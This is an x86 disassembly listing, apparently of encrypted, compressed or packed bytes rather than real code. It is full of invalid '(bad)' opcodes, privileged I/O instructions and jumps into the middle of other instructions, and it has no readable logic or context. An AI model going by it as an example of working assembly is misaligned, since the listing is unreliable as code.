  402285:	test   eax,0x7104c455
  40228a:	mov    WORD PTR [eax-0x55],gs
  40228d:	push   0xffffff8a
  40228f:	inc    eax
  402290:	test   BYTE PTR [eax+esi*1+0x32],dh
  402294:	inc    ebx
  402295:	xchg   ebp,eax
  402296:	xchg   edx,eax
  402297:	mov    ds:0x4817d9b8,eax
  40229c:	sub    esp,DWORD PTR [ecx]
  40229e:	xchg   ecx,eax
  40229f:	addr16 popa 
  4022a1:	push   ss
  4022a2:	pop    edi
  4022a3:	mov    ch,0x39
  4022a5:	mov    eax,ds:0x974f881f
  4022aa:	dec    esp
  4022ab:	das    
  4022ac:	cmp    ecx,ebx
  4022ae:	test   BYTE PTR [edx],0x5e
  4022b1:	ret    0xc134
  4022b4:	cmp    eax,0x6cb3769a
  4022b9:	(bad)  
  4022bb:	ins    DWORD PTR es:[edi],dx
  4022bc:	cld    
  4022bd:	add    dh,BYTE PTR [edx]
  4022bf:	pop    esp
  4022c0:	jne    0x4022ba
  4022c2:	aas    
  4022c3:	jne    0x402254
  4022c5:	cmp    eax,DWORD PTR [eax]
  4022c7:	(bad)  
  4022c8:	mov    ecx,0x734bac4
  4022cd:	dec    esp
  4022ce:	out    0x1a,eax
  4022d0:	aad    0xc
  4022d2:	mov    ebx,0x1365efd
  4022d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022d8:	mov    bh,0xa7
  4022da:	test   BYTE PTR [edx-0xf],ch
  4022dd:	mov    cl,0xb1
  4022df:	jmp    0x40230d
  4022e1:	push   esp
  4022e2:	xor    al,0xcd
  4022e4:	lea    eax,[esi+0x4e0ee513]
  4022ea:	pop    esp
  4022eb:	and    ah,dl
  4022ed:	call   0x84ae:0x9ebe02a6
  4022f4:	fdivr  DWORD PTR [edx+0x4f3b14c7]
  4022fa:	aad    0x55
  4022fc:	fdivr  st,st(6)
  4022fe:	aam    0xd6
  402300:	das    
  402301:	and    BYTE PTR [eax-0x16],bh
  402304:	mov    esi,0x29cd1f7c
  402309:	scas   eax,DWORD PTR es:[edi]
  40230a:	lahf   
  40230b:	outs   dx,DWORD PTR ds:[esi]
  40230c:	aam    0x29
  40230e:	scas   al,BYTE PTR es:[edi]
  40230f:	mov    esi,0x8e33a1bf
  402314:	ss xchg ebx,eax
  402316:	xor    eax,DWORD PTR [ebx]
  402318:	loopne 0x4022ce
  40231a:	mov    ds:0x7b5a785,eax
  40231f:	adc    bl,BYTE PTR [eax-0x42fdb8f7]
  402325:	sub    DWORD PTR [ebx+0x3b12597b],esp
  40232b:	(bad)  
  40232c:	cmp    eax,0x2a1dec84
  402331:	adc    al,0x1
  402333:	sub    ch,BYTE PTR [esi]
  402335:	sbb    ebx,DWORD PTR [ebx+0x24]
  402338:	xor    dl,al
  40233a:	dec    esp
  40233b:	mov    al,ds:0x83338289
  402340:	mov    ecx,DWORD PTR [ebx-0x6e06bf78]
  402346:	mov    bh,0x55
  402348:	inc    ecx
  402349:	mov    edx,0xf649d0fa
  40234e:	js     0x402381
  402350:	pop    ss
  402351:	inc    ebx
  402352:	mov    ah,0x70
  402354:	fst    DWORD PTR [esi+ebp*8-0x76]
  402358:	or     eax,0x33482cc8
  40235d:	(bad)  
  40235e:	sbb    eax,0x3cc24681
  402363:	cdq    
  402364:	mov    ebx,0xd26208b8
  402369:	mov    eax,0x4a37953e
  40236e:	jle    0x4023c8
  402370:	and    eax,ebx
  402372:	or     DWORD PTR [eax-0x282e43f5],esi
  402378:	sbb    DWORD PTR [ebp+0x32bbc3c],ebx
  40237e:	mov    esp,0xe248af70
  402383:	aam    0xe7
  402385:	xor    bl,dl
  402387:	fisubr DWORD PTR [edx+eax*1]
  40238a:	inc    eax
  40238b:	mov    ebx,0xe29d8394
  402390:	dec    edi
  402391:	add    eax,DWORD PTR [ebp-0x56]
  402394:	jo     0x40240c
  402396:	cwde   
  402397:	or     al,0x29
  402399:	call   0x4a9738e3
  40239e:	sub    al,0x94
  4023a0:	jb     0x402358
  4023a2:	in     eax,0x56
  4023a4:	jo     0x402347
  4023a6:	mov    cl,0xfa
  4023a8:	or     al,0xd
  4023aa:	clc    
  4023ab:	ja     0x402427
  4023ad:	mov    DWORD PTR [edi-0x21],edi
  4023b0:	aaa    
  4023b1:	adc    ch,BYTE PTR [edx+eiz*4]
  4023b4:	mov    edi,0x13b9321c
  4023b9:	push   ecx
  4023ba:	mov    ch,0x4d
  4023bc:	mov    al,0x7
  4023be:	pop    ebx
  4023bf:	(bad)  
  4023c0:	mov    WORD PTR [ebx],?
  4023c2:	sbb    eax,0x422e10af
  4023c7:	repnz lock push 0xffffffce
  4023cb:	out    0xf2,al
  4023cd:	retfw  
  4023cf:	ret    0xb756
  4023d2:	movups xmm2,xmm3
  4023d5:	dec    ebx
  4023d6:	mov    dl,0xcc
  4023d8:	hlt    
  4023d9:	mov    gs,WORD PTR [edi-0x64]
  4023dc:	xor    eax,0x2aa78e86
  4023e1:	stos   DWORD PTR es:[edi],eax
  4023e2:	jo     0x4023d3
  4023e4:	push   0x5915a281
  4023e9:	jb     0x402439
  4023eb:	addr16 xor esp,ebp
  4023ee:	cmp    eax,0xe58255a9
  4023f3:	mov    ?,esp
  4023f5:	push   0xffffff97
  4023f7:	jle    0x4023c2
  4023f9:	mul    DWORD PTR [eax]
  4023fb:	push   edi
  4023fc:	cwde   
  4023fd:	stc    
  4023fe:	adc    al,0xe0
  402400:	mov    ah,0x8d
  402402:	adc    al,dh
  402404:	inc    ebp
  402405:	add    cl,BYTE PTR [eax-0x7b]
  402408:	daa    
  402409:	icebp  
  40240a:	mov    WORD PTR [ecx+edi*8+0x65],cs
  40240e:	jmp    0x402445
  402410:	mov    al,0x6d
  402412:	push   edi
  402413:	rcl    DWORD PTR [eax+eiz*4],0x6e
  402417:	push   ebp
  402418:	arpl   WORD PTR [edi-0x6818dc5b],bx
  40241e:	dec    edi
  40241f:	popa   
  402420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402421:	or     al,0x3c
  402423:	xchg   ecx,eax
  402424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402425:	das    
  402426:	pop    ss
  402427:	sub    eax,0xe047c2ac
  40242c:	sahf   
  40242d:	pushf  
  40242e:	inc    eax
  40242f:	jp     0x402492
  402431:	dec    esp
  402432:	push   edx
  402433:	shr    DWORD PTR [edi+0x42],cl
  402436:	mov    esi,0x84b03022
  40243b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40243c:	into   
  40243d:	mov    ebx,0xd4829386
  402442:	jl     0x4023d1
  402444:	or     DWORD PTR [ecx+0xccccb0c],0x2c15e5ac
  40244e:	fcomp  QWORD PTR ds:0x345ca429
  402455:	or     al,0xd3
  402457:	(bad)  
  402458:	mov    ebx,0xce3a7fed
  40245d:	sbb    al,0xd7
  40245f:	cmp    al,0xbe
  402461:	push   esp
  402462:	mov    cl,al
  402464:	mov    al,0x23
  402466:	imul   edx,DWORD PTR [edi],0x51
  402469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40246a:	pop    edi
  40246b:	ret    
  40246c:	mov    dl,0xd0
  40246e:	in     eax,0x82
  402470:	popa   
  402471:	add    esp,DWORD PTR [eax]
  402473:	(bad)  
  402474:	sub    eax,0x3f2fcee5
  402479:	sub    ecx,edx
  40247b:	jg     0x402483
  40247d:	js     0x402434
  40247f:	lock pop edx
  402481:	fs (bad) 
  402483:	adc    edx,DWORD PTR [ebx]
  402485:	addr16 retf 
  402487:	push   ebx
  402488:	push   esi
  402489:	fs fsubr st(2),st
  40248c:	xor    BYTE PTR [ecx],ch
  40248e:	out    0x58,eax
  402490:	jmp    0x4024f7
  402492:	stos   DWORD PTR es:[edi],eax
  402493:	ins    DWORD PTR es:[edi],dx
  402494:	scas   eax,DWORD PTR es:[edi]
  402495:	mov    eax,0x81ef4b8c
  40249a:	stos   BYTE PTR es:[edi],al
  40249b:	ret    
  40249c:	sub    eax,0xa34fec09
  4024a1:	jb     0x4024f0
  4024a3:	dec    ebx
  4024a4:	xchg   ecx,eax
  4024a5:	arpl   si,sp
  4024a7:	mov    dl,BYTE PTR [eax+eiz*8-0x9]
  4024ab:	in     al,0xb4
  4024ad:	loop   0x402514
  4024af:	add    BYTE PTR [edi-0x4385f835],cl
  4024b5:	adc    al,0x99
  4024b7:	push   cs
  4024b8:	fwait
  4024b9:	dec    edx
  4024ba:	test   eax,0xa6dab79f
  4024bf:	push   ecx
  4024c0:	leave  
  4024c1:	popa   
  4024c2:	cdq    
  4024c3:	inc    ebx
  4024c4:	mov    bl,0x27
  4024c6:	sub    eax,0xa0ea56e4
  4024cb:	leave  
  4024cc:	popa   
  4024cd:	sub    esp,DWORD PTR [ebx]
  4024cf:	adc    eax,0x8071e6e3
  4024d4:	rol    DWORD PTR [eax],1
  4024d6:	or     eax,0xdd54974d
  4024db:	out    dx,al
  4024dc:	sbb    ah,bh
  4024de:	xchg   BYTE PTR ds:0x460782b7,bh
  4024e4:	sbb    esp,DWORD PTR [edi]
  4024e6:	and    ecx,ecx
  4024e8:	sub    BYTE PTR [ebx+0x1e],ah
  4024eb:	call   0x996e8d2b
  4024f0:	out    dx,al
  4024f1:	in     eax,0x5c
  4024f3:	int3   
  4024f4:	test   al,0x8
  4024f6:	sub    al,BYTE PTR [ebx+0x16ac9e1b]
  4024fc:	push   edx
  4024fd:	ds (bad) 
  4024ff:	jp     0x4024d5
  402501:	and    eax,0x14730692
  402506:	mov    al,0xd7
  402508:	mov    ch,0x3a
  40250a:	pop    ebp
  40250b:	push   edx
  40250c:	(bad)  [ebx]
  40250e:	jg     0x40256a
  402510:	pop    ss
  402511:	adc    eax,0xab0f8f8
  402516:	sbb    al,0xa4
  402518:	mov    al,0x80
  40251a:	inc    ebp
  40251b:	lods   eax,DWORD PTR ds:[esi]
  40251c:	lahf   
  40251d:	pusha  
  40251e:	push   ebp
  40251f:	je     0x402583
  402521:	xchg   esi,eax
  402522:	aad    0xba
  402524:	pop    edx
  402525:	popa   
  402526:	addr16 pop ecx
  402528:	or     eax,esi
  40252a:	pop    es
  40252b:	push   ss
  40252c:	and    DWORD PTR [eax+0x36af2147],esp
  402532:	jmp    0x9823faa4
  402537:	int3   
  402538:	punpcklwd mm5,DWORD PTR [ebp+0x1bdb871]
  40253f:	(bad)  
  402540:	jns    0x40250f
  402542:	lds    edi,FWORD PTR [edi]
  402544:	lods   al,BYTE PTR ds:[esi]
  402545:	cwde   
  402546:	(bad)  
  402548:	pop    ebx
  402549:	pop    edx
  40254a:	aaa    
  40254b:	popa   
  40254c:	cli    
  40254d:	inc    edx
  40254e:	sub    edx,DWORD PTR [ebx]
  402550:	ss (bad) 
  402552:	fidivr WORD PTR [eax]
  402554:	push   cs
  402555:	pop    esi
  402556:	rcr    esp,1
  402558:	mov    ebx,0x9e7d3954
  40255d:	lods   eax,DWORD PTR ds:[esi]
  40255e:	mov    WORD PTR [edi],cs
  402560:	dec    edx
  402561:	push   0xf3cb82b8
  402566:	aas    
  402567:	and    DWORD PTR [esi],esi
  402569:	mov    bh,0x88
  40256b:	mov    ds:0x4162dfd5,eax
  402570:	mov    eax,ds:0x5f0790f0
  402575:	mov    DWORD PTR [ecx],edx
  402577:	xor    eax,0xe7213a85
  40257c:	or     DWORD PTR [esi],esi
  40257e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40257f:	and    BYTE PTR [esi+ebp*1+0x65fe8624],dh
  402586:	jae    0x40252d
  402588:	mov    ebp,0x8fdda295
  40258d:	mov    esp,0x58c45e32
  402592:	inc    ebp
  402593:	xchg   ebx,eax
  402594:	sub    eax,0x6ce2ba62
  402599:	jmp    0xd031cdfd
  40259e:	pop    esp
  40259f:	data16 or cl,BYTE PTR [edi+ebp*8-0x1a]
  4025a4:	(bad)  
  4025a5:	jbe    0x40254c
  4025a7:	inc    edx
  4025a8:	inc    esp
  4025a9:	adc    ch,BYTE PTR cs:[ecx+edi*2+0x46]
  4025ae:	adc    bl,al
  4025b0:	pop    esp
  4025b1:	jmp    0x4025af
  4025b3:	push   esp
  4025b4:	sbb    BYTE PTR ds:0xc439009f,dl
  4025ba:	hlt    
  4025bb:	xchg   esp,eax
  4025bc:	retf   
  4025bd:	jmp    DWORD PTR [eax-0x10]
  4025c0:	push   ebp
  4025c1:	cmp    ch,BYTE PTR [esp+esi*8+0x23a5ca02]
  4025c8:	(bad)  
  4025ca:	lds    esp,FWORD PTR [edx+0x16]
  4025cd:	repz xchg ecx,eax
  4025cf:	inc    esp
  4025d0:	icebp  
  4025d1:	daa    
  4025d2:	add    BYTE PTR [ebp+0x1a736ed1],cl
  4025d8:	lock and edx,DWORD PTR [ebx-0x1d]
  4025dc:	hlt    
  4025dd:	(bad)  
  4025de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025df:	fadd   st(4),st
  4025e1:	outs   dx,DWORD PTR ds:[esi]
  4025e2:	frstor [ebx+0x4db99eec]
  4025e8:	cmp    eax,0xe90f4966
  4025ed:	je     0x402645
  4025ef:	xchg   BYTE PTR [ebp+0xb53ca1c],al
  4025f5:	sahf   
  4025f6:	add    eax,0x31eb9c4
  4025fb:	jb     0x40264a
  4025fd:	lahf   
  4025fe:	mov    cs,WORD PTR [edx+0x336d945f]
  402604:	retf   0x45cb
  402607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402608:	or     al,0xed
  40260a:	adc    eax,0x63adfed1
  40260f:	and    DWORD PTR [edi-0x5df68b10],esi
  402615:	sub    eax,0xb0ac04b5
  40261a:	repnz (bad) 
  40261c:	adc    DWORD PTR ds:0x168b742f,eax
  402622:	adc    esi,DWORD PTR [esi-0x3fc5ea1b]
  402628:	xchg   edi,eax
  402629:	sahf   
  40262a:	jmp    0x402640
  40262c:	fidiv  DWORD PTR [ebx+ebx*4-0x557220ff]
  402633:	inc    esi
  402634:	sbb    dl,BYTE PTR [ebx-0x28c8bbe7]
  40263a:	inc    ecx
  40263b:	call   0xdf5d7524
  402640:	mov    bl,0xb0
  402642:	fadd   st(2),st
  402644:	ret    
  402645:	scas   eax,DWORD PTR es:[edi]
  402646:	cs bnd jo 0x4025e7
  40264a:	xor    DWORD PTR [ebp+0x5ea7bc1b],0xffffffaa
  402651:	dec    edx
  402652:	jne    0x4026b8
  402654:	pop    ebx
  402655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402656:	pop    ss
  402657:	mov    WORD PTR [ebx+eax*8],cs
  40265a:	rol    dl,cl
  40265c:	mov    DWORD PTR [esi-0x61],edi
  40265f:	mov    BYTE PTR [ebx-0x545c2f0b],bl
  402665:	rcr    DWORD PTR [ebp-0x2f],cl
  402668:	icebp  
  402669:	mov    ecx,0x53da99f9
  40266e:	add    al,0x74
  402670:	mov    cl,0xb4
  402672:	push   cs
  402673:	jl     0x40262a
  402675:	cmp    al,0x8f
  402677:	inc    esp
  402678:	mov    ds:0xe26cb6ef,al
  40267d:	in     al,0xb
  40267f:	mov    al,ds:0xb13edd73
  402684:	outs   dx,DWORD PTR ds:[esi]
  402685:	lods   al,BYTE PTR ds:[esi]
  402686:	ror    cl,0xf2
  402689:	adc    al,BYTE PTR [ecx]
  40268b:	lods   al,BYTE PTR ds:[esi]
  40268c:	inc    eax
  40268d:	ins    BYTE PTR es:[edi],dx
  40268e:	add    ecx,DWORD PTR [ecx-0x3c]
  402691:	(bad)  
  402692:	push   eax
  402693:	je     0x4026b1
  402695:	popf   
  402696:	dec    esp
  402697:	adc    ebp,DWORD PTR [edi+edi*1-0x5467b08b]
  40269e:	sub    eax,DWORD PTR [edi]
  4026a0:	pop    ebx
  4026a1:	jecxz  0x4026c1
  4026a3:	imul   esp,DWORD PTR [edi-0x6d],0x26
  4026a7:	push   ds
  4026a8:	stos   DWORD PTR es:[edi],eax
  4026a9:	inc    edx
  4026aa:	(bad)  
  4026ab:	test   al,0xc
  4026ad:	add    eax,0x96a07c36
  4026b2:	lock fcomp QWORD PTR [eax-0x4891c801]
  4026b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ba:	jmp    DWORD PTR [ebx]
  4026bc:	sbb    DWORD PTR [eax+0x50a5f11c],edi
  4026c2:	call   0x8afefb24
  4026c7:	mov    ecx,0xa5bb5b75
  4026cc:	cdq    
  4026cd:	push   ecx
  4026ce:	cld    
  4026cf:	mov    edx,0xb0cea00f
  4026d4:	jl     0x402703
  4026d6:	test   BYTE PTR [edi+0x1f71e03f],dl
  4026dc:	mov    bh,0x4c
  4026de:	pop    es
  4026df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026e0:	dec    ebp
  4026e1:	jmp    0xcefd1c07
  4026e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026e7:	mov    esp,0x90f7958a
  4026ec:	or     DWORD PTR [esi],edx
  4026ee:	aaa    
  4026ef:	test   bl,0x72
  4026f2:	mov    bh,0x4d
  4026f4:	push   0x1e3db1d1
  4026f9:	mov    BYTE PTR [ebx-0x4e],bh
  4026fc:	cmp    DWORD PTR [esi-0x30],0xffffff97
  402700:	(bad)  
  402701:	int    0x52
  402703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402704:	fld    QWORD PTR [ebx+esi*8]
  402707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402708:	adc    DWORD PTR [edi+esi*8+0x50],ecx
  40270c:	dec    esi
  40270d:	xchg   ebp,eax
  40270e:	mov    dh,0x57
  402710:	xchg   edx,eax
  402711:	pusha  
  402712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402713:	push   ecx
  402714:	or     DWORD PTR [ebp-0x6d],esp
  402717:	push   ebx
  402718:	pop    edi
  402719:	das    
  40271a:	jae    0x4026d9
  40271c:	cmp    esp,ecx
  40271e:	adc    DWORD PTR [edi+0x6c],eax
  402721:	bound  edi,QWORD PTR [ebx+0x39]
  402724:	and    al,BYTE PTR [ecx+ebx*2]
  402727:	in     eax,dx
  402728:	push   0xfffffff2
  40272a:	add    ebp,ebp
  40272c:	inc    esi
  40272d:	or     BYTE PTR [ecx-0x35],0x1d
  402731:	adc    DWORD PTR [edi+edx*4+0x35],esp
  402735:	mov    al,ds:0x8ea7940f
  40273a:	inc    esp
  40273b:	mov    BYTE PTR [ebp+0x61],bh
  40273e:	outs   dx,DWORD PTR ds:[esi]
  40273f:	mov    eax,ds:0x9ecefdca
  402744:	dec    edi
  402745:	(bad)  
  402746:	mov    ebp,0xe54fce67
  40274b:	sub    BYTE PTR [edx+0x6ca2954],0x92
  402752:	and    al,0x50
  402754:	pushf  
  402755:	sub    BYTE PTR [edi-0x1242e070],0xb
  40275c:	je     0x4027af
  40275e:	xor    DWORD PTR [ebx+eiz*4-0x3],esi
  402762:	or     al,0x2c
  402764:	dec    esp
  402765:	sahf   
  402766:	mov    ds:0x6da309da,al
  40276b:	mov    eax,ds:0xb3fc9be3
  402770:	int3   
  402771:	cmc    
  402772:	mov    DWORD PTR ds:0x63bf0235,edi
  402778:	rcr    bl,1
  40277a:	jge    0x40272b
  40277c:	(bad)  
  40277d:	xchg   ecx,eax
  40277e:	sti    
  40277f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402780:	shr    BYTE PTR [ebp-0x301e9d6a],0x18
  402787:	test   BYTE PTR [esi-0x3a87b7d2],dh
  40278d:	add    cl,BYTE PTR [eax]
  40278f:	add    DWORD PTR [ebx+0x12ddb385],esi
  402795:	bound  edi,QWORD PTR [ecx]
  402797:	mov    bl,BYTE PTR [edi+0x41]
  40279a:	ds push ds
  40279c:	and    DWORD PTR [ebx-0x22],0xffffffd8
  4027a0:	mov    al,ds:0xad6458d4
  4027a5:	shl    ah,1
  4027a7:	cmp    eax,0x46c49947
  4027ac:	mov    edi,0xb857c4a6
  4027b1:	scas   al,BYTE PTR es:[edi]
  4027b2:	jne    0x4027c6
  4027b4:	in     al,0x66
  4027b6:	mov    ds:0xb6668e3a,al
  4027bb:	mov    DWORD PTR [edx+0x7cd1ba31],ebp
  4027c1:	shl    DWORD PTR [edi-0xe],1
  4027c4:	shr    esi,cl
  4027c6:	push   es
  4027c7:	imul   esp,DWORD PTR [ecx+0x17],0x9b1d5924
  4027ce:	mov    bh,0x90
  4027d0:	mov    bh,0xfd
  4027d2:	pop    ecx
  4027d3:	stc    
  4027d4:	std    
  4027d5:	mov    esi,0x9119660b
  4027da:	cmp    edx,DWORD PTR [ebx+0x7db3216]
  4027e0:	pop    edx
  4027e1:	cli    
  4027e2:	mov    bl,0xe4
  4027e4:	inc    edx
  4027e5:	mov    BYTE PTR [edx],ah
  4027e7:	sub    BYTE PTR [esi-0x5532d86a],0x8f
  4027ee:	jne    0x4027da
  4027f0:	dec    ebp
  4027f1:	mov    edx,0xf6238d4f
  4027f6:	mov    ds:0x1c06c55b,eax
  4027fb:	mov    bh,ah
  4027fd:	jnp    0x402872
  4027ff:	jb     0x40285d
  402801:	(bad)  
  402802:	pop    ds
  402803:	outs   dx,DWORD PTR ds:[esi]
  402804:	aaa    
  402805:	inc    ecx
  402806:	sub    edi,DWORD PTR [edi+0x2e2fed04]
  40280c:	xor    al,0x49
  40280e:	(bad)  
  40280f:	jg     0x4027f6
  402811:	and    BYTE PTR [ebx-0x373ecc61],ah
  402817:	jp     0x40283d
  402819:	outs   dx,BYTE PTR ds:[esi]
  40281a:	inc    esp
  40281b:	lds    esi,FWORD PTR [eax]
  40281d:	jns    0x402811
  40281f:	test   eax,0x2ae52395
  402824:	jo     0x402896
  402826:	mov    edi,0xcdacb53a
  40282b:	mov    ss,WORD PTR [eax]
  40282d:	and    al,ch
  40282f:	lahf   
  402830:	dec    DWORD PTR gs:[edx]
  402833:	test   al,0xf6
  402835:	jecxz  0x402837
  402837:	or     edi,DWORD PTR [ecx-0x2714a6a3]
  40283d:	stc    
  40283e:	jbe    0x402895
  402840:	cdq    
  402841:	and    eax,0x6fa22023
  402846:	dec    ebx
  402847:	sbb    al,0x5f
  402849:	ss es lahf 
  40284c:	add    esp,ebp
  40284e:	and    BYTE PTR [ebx+0x4],cl
  402851:	jmp    0x402847
  402853:	inc    esi
  402854:	imul   ebx,DWORD PTR [eax+0x35],0x10
  402858:	lds    eax,FWORD PTR [eax]
  40285a:	sub    edi,ecx
  40285c:	(bad)  
  40285d:	mov    cl,0x44
  40285f:	or     cl,BYTE PTR [ebp-0x7582742b]
  402865:	dec    edi
  402866:	pop    ds
  402867:	mov    ch,dh
  402869:	rcl    BYTE PTR [edx+eiz*2],1
  40286c:	jno    0x402834
  40286e:	sub    DWORD PTR [edx],esi
  402870:	add    BYTE PTR fs:[ecx+esi*4],dl
  402874:	mov    al,0xd9
  402876:	cdq    
  402877:	out    0x61,eax
  402879:	jge    0x402859
  40287b:	daa    
  40287c:	(bad)  
  40287e:	mov    ch,0xd2
  402880:	retf   0xc420
  402883:	dec    ecx
  402884:	(bad)  
  402885:	das    
  402886:	rcl    dh,0x1a
  402889:	sahf   
  40288a:	xor    eax,eax
  40288c:	packuswb mm7,mm6
  40288f:	xchg   edx,eax
  402890:	sub    al,0xa0
  402892:	mov    eax,0x604b27ba
  402897:	cmp    al,0xaf
  402899:	sub    DWORD PTR [ecx-0x2f],edi
  40289c:	js     0x4028d0
  40289e:	rcl    BYTE PTR [ebx+0x1761de80],1
  4028a4:	mov    bl,0x7
  4028a6:	aad    0xdd
  4028a8:	inc    edi
  4028a9:	jns    0x4028c8
  4028ab:	jbe    0x4028fc
  4028ad:	lahf   
  4028ae:	scas   eax,DWORD PTR es:[edi]
  4028af:	inc    ebp
  4028b0:	(bad)  
  4028b1:	jae    0x40291d
  4028b3:	adc    al,0x43
  4028b5:	outs   dx,DWORD PTR ds:[esi]
  4028b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028b7:	fistp  WORD PTR [ecx+eiz*1+0x4a51ad3d]
  4028be:	jae    0x40288b
  4028c0:	jmp    FWORD PTR [ebx-0x4cd8f66e]
  4028c6:	fstp   TBYTE PTR [ebx-0x3c1d599b]
  4028cc:	gs cmp al,0x14
  4028cf:	ins    BYTE PTR es:[edi],dx
  4028d0:	pop    ebp
  4028d1:	addr16 mov al,0x94
  4028d4:	loopne 0x4028b1
  4028d6:	(bad)  
  4028d7:	mov    bh,0x41
  4028d9:	or     eax,0xe2aaa2d0
  4028de:	test   BYTE PTR [edi-0x60e5d81f],cl
  4028e4:	shl    BYTE PTR [ebx],0x7
  4028e7:	lock out dx,al
  4028e9:	(bad)  
  4028ea:	adc    DWORD PTR ds:0xea79f198,edi
  4028f0:	ss popa 
  4028f2:	add    al,0x6
  4028f4:	dec    ebx
  4028f5:	push   edx
  4028f6:	and    esp,DWORD PTR [ebp+0x5856dc2]
  4028fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028fd:	pop    ecx
  4028fe:	not    bl
  402900:	ret    
  402901:	inc    edx
  402902:	fadd   DWORD PTR [esi+0x49f5b0f5]
  402908:	pop    ebx
  402909:	cmc    
  40290a:	pop    ds
  40290b:	aad    0x2c
  40290d:	jb     0x4028a0
  40290f:	add    ebp,eax
  402911:	aam    0x5a
  402913:	pop    esi
  402914:	lods   eax,DWORD PTR ds:[esi]
  402915:	ins    DWORD PTR es:[edi],dx
  402916:	inc    ecx
  402917:	jp     0x402952
  402919:	(bad)  
  40291a:	shl    BYTE PTR [eax+0x6c],0x9e
  40291e:	retf   0xe1e4
  402921:	push   edx
  402922:	cmp    al,0x95
  402924:	pop    ebx
  402925:	mov    dl,0xba
  402927:	test   ebx,edx
  402929:	sub    eax,0x6c9d03d5
  40292e:	push   ds
  40292f:	mov    ah,0x95
  402931:	shr    DWORD PTR [eax+ecx*4-0x7b],0x40
  402936:	leave  
  402937:	mov    ah,0xde
  402939:	sub    DWORD PTR [edi-0x3c],0xdb9762a3
  402940:	dec    esi
  402941:	repz sub bl,dl
  402944:	mov    BYTE PTR [edx-0x12fcab96],al
  40294a:	gs test al,0x8a
  40294d:	jmp    0x402917
  40294f:	and    BYTE PTR [esi+0x63],bl
  402952:	pop    eax
  402953:	mov    BYTE PTR [ebp-0x22],al
  402956:	jp     0x40290f
  402958:	iret   
  402959:	fnsave [eax-0x7fb2bb27]
  40295f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402960:	loope  0x402981
  402962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402963:	in     al,dx
  402964:	lock into 
  402966:	jle    0x40291f
  402968:	mov    al,ds:0xae66349
  40296d:	lods   eax,DWORD PTR ds:[esi]
  40296e:	pop    ecx
  40296f:	in     al,dx
  402970:	sub    ch,BYTE PTR [ecx+0x4c]
  402973:	lods   eax,DWORD PTR ds:[esi]
  402974:	adc    eax,0x2341bae
  402979:	or     bh,BYTE PTR [edx]
  40297b:	and    ebp,DWORD PTR [edx+ecx*2-0x4d3fc0c6]
  402982:	sbb    dl,BYTE PTR [eax-0x7cdeef6e]
  402988:	or     DWORD PTR [ecx+0x16],edx
  40298b:	jl     0x402a0b
  40298d:	cmp    eax,0x42decb63
  402992:	or     BYTE PTR [ecx-0x45],bh
  402995:	(bad)  
  402996:	cmp    ecx,ebp
  402998:	(bad)  
  402999:	jg     0x40293d
  40299b:	leave  
  40299c:	mov    bl,0x29
  40299e:	jbe    0x402a16
  4029a0:	jmp    0x402945
  4029a2:	adc    eax,0x2dc95e51
  4029a7:	pop    esi
  4029a8:	push   ebp
  4029a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029aa:	xor    dh,BYTE PTR ds:0xef9fe19c
  4029b0:	ja     0x4029d9
  4029b2:	out    0x8e,eax
  4029b4:	xchg   ebp,eax
  4029b5:	dec    DWORD PTR [edx]
  4029b7:	mov    eax,DWORD PTR [ebx+0x79]
  4029ba:	shr    BYTE PTR [edx],cl
  4029bc:	push   0x1e
  4029be:	or     al,0x60
  4029c0:	cmp    eax,0xca9c832a
  4029c5:	das    
  4029c6:	cmp    eax,ebx
  4029c8:	push   ss
  4029c9:	sbb    eax,DWORD PTR [edi]
  4029cb:	mov    bh,BYTE PTR [esi-0x3a]
  4029ce:	addr16 dec ebp
  4029d0:	inc    esi
  4029d1:	clc    
  4029d2:	enter  0x8394,0x4a
  4029d6:	xchg   edi,eax
  4029d7:	ret    0x7d3f
  4029da:	pop    edx
  4029db:	popf   
  4029dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029dd:	add    esi,ebx
  4029df:	pop    ebp
  4029e0:	jne    0x4029a6
  4029e2:	aad    0x46
  4029e4:	add    dl,dh
  4029e6:	hlt    
  4029e7:	lahf   
  4029e8:	or     BYTE PTR [ebx-0x5e],ah
  4029eb:	ror    DWORD PTR [edx],0x10
  4029ee:	shr    esp,cl
  4029f0:	or     esi,DWORD PTR [ecx]
  4029f2:	xor    BYTE PTR [esi],al
  4029f4:	and    BYTE PTR [esi+ebx*8-0x6d],dh
  4029f8:	and    al,0x48
  4029fb:	or     al,0x4d
  4029fd:	jo     0x4029a2
  4029ff:	mov    al,ds:0x591445f2
  402a04:	or     DWORD PTR [edx+0x7eb4a8f0],edx
  402a0a:	sahf   
  402a0b:	aas    
  402a0c:	inc    ecx
  402a0d:	ins    DWORD PTR es:[edi],dx
  402a0e:	inc    edx
  402a0f:	(bad)  
  402a10:	jl     0x402998
  402a12:	mov    esp,0x19ff54e8
  402a17:	mov    BYTE PTR [ebp-0x38],ah
  402a1a:	xor    eax,0xa97aec09
  402a1f:	loop   0x4029b1
  402a21:	loopne 0x402a4d
  402a23:	sti    
  402a24:	push   eax
  402a25:	inc    ebx
  402a26:	jmp    0x68326d3c
  402a2b:	adc    eax,0xac9cd0cb
